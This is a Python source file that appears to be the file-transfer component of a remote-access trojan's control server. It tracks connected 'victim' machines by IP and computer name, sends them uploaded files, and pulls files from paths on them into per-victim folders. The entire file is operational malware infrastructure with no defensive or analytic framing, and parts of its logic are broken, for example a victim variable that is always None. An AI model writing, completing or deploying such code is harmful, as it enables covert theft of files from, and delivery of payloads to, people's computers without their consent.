import socket
import os
import threading
from fastapi import UploadFile
import time


class FileTransferManager:
    def __init__(self, upload_host, upload_port, download_host, download_port):
        self.upload_host = upload_host
        self.upload_port = upload_port

        self.download_host = download_host
        self.download_port = download_port
        self.upload_clients = []

        self.download_clients = []

    def start_upload_server(self):
        # Initialize a socket for file transfers
        upload_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        upload_server.bind((self.upload_host, self.upload_port))
        upload_server.listen(5)
        print(
            f"[*] File transfer server is listening on {self.upload_host}:{self.upload_port}")

        while True:
            try:
                client_socket, addr = upload_server.accept()
                print(
                    f"[*] File transfer connection established with {addr[0]}")

                # Add the client socket to the list of upload_clients
                self.upload_clients.append((client_socket, addr))

                # Handle file transfer logic here
                threading.Thread(target=self.handle_file_transfer,
                                 args=(client_socket,)).start()
            except Exception as e:
                print(f"[*] Error handling file transfer: {str(e)}")
                for client in self.upload_clients:
                    if (client[0] == client_socket):
                        self.upload_clients.remove(client)
                break

    def start_download_server(self):
        # Initialize a socket for file transfers
        download_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        download_server.bind((self.download_host, self.download_port))
        download_server.listen(5)
        print(
            f"[*] File transfer server is listening on {self.download_host}:{self.download_port}")

        while True:
            try:
                client_socket, addr = download_server.accept()
                print(
                    f"[*] File transfer connection established with {addr[0]}")

                # Add the client socket to the list of download_clients
                self.download_clients.append((client_socket, addr))

                # Handle file transfer logic here
                threading.Thread(target=self.handle_file_transfer,
                                 args=(client_socket,)).start()
            except Exception as e:
                print(f"[*] Error handling file transfer: {str(e)}")
                for client in self.download_clients:
                    if (client[0] == client_socket):
                        self.download_clients.remove(client)
                break

    def handle_file_transfer(self, client_socket):
        while True:
            try:
                # Receive the filename from the client
                filename = client_socket.recv(1024).decode()
                if not filename:
                    break

                # Receive the file size from the client
                file_size = int(client_socket.recv(1024).decode())
                victim = None

                if victim:
                    directory = f"data/{victim['Name']}/received_files/"
                    if not os.path.exists(directory):
                        os.makedirs(directory)

                    filepath = os.path.join(directory, filename)

                    # Receive and save the file data
                    with open(filepath, "wb") as file:
                        remaining_bytes = file_size
                        while remaining_bytes > 0:
                            data = client_socket.recv(
                                min(remaining_bytes, 1024))
                            if not data:
                                break
                            file.write(data)
                            remaining_bytes -= len(data)

                    print(f"[*] Received file: {filepath}")

            except Exception as e:
                print(f"[*] Error handling file transfer: {str(e)}")
                break

    async def upload_file(self, victim, file: UploadFile):
        for client_socket, client_addr in self.upload_clients:
            if client_addr[0] == victim.socket_ip:
                print(f"[*] Found client socket for {victim.computer_name}")
                try:
                    # Send the file name and size
                    client_socket.send(file.filename.encode())

                    # Use a file stream to get the file size
                    fs = await file.read()
                    print(f"[*] Size of file: {len(fs)}")
                    client_socket.send(str(len(fs)).encode())

                    time.sleep(0.5)

                    # Send the file data
                    client_socket.sendall(fs)

                    # Signal the end of file transfer
                    client_socket.send(b"<ENDOF>")
                    print(
                        f"[*] Uploaded file: {file.filename} to {client_addr[0]}")
                except Exception as e:
                    print(f"[*] Error uploading file: {str(e)}")

    async def download_file(self, victim, filepath):
        print(f"[*] Downloading file: {filepath} from {victim.computer_name}")
        print(f"[*] upload_clients list: {self.download_clients}")
        for client_socket, client_addr in self.download_clients:
            print(f"[*] Checking client socket: {client_addr[0]}")
            if client_addr[0] == victim.socket_ip:
                print(f"[*] Found client socket for {victim.computer_name}")
                try:
                    # Send the file name and size
                    client_socket.send(filepath.encode())

                    # Receive the file size
                    file_size = int(client_socket.recv(1024).decode())

                    # Receive and save the file data
                    with open(filepath, "wb") as file:
                        remaining_bytes = file_size
                        while remaining_bytes > 0:
                            data = client_socket.recv(
                                min(remaining_bytes, 1024))
                            if not data:
                                break
                            file.write(data)
                            remaining_bytes -= len(data)

                    print(
                        f"[*] Downloaded file: {filepath} from {client_addr[0]}")
                except Exception as e:
                    print(f"[*] Error downloading file: {str(e)}")
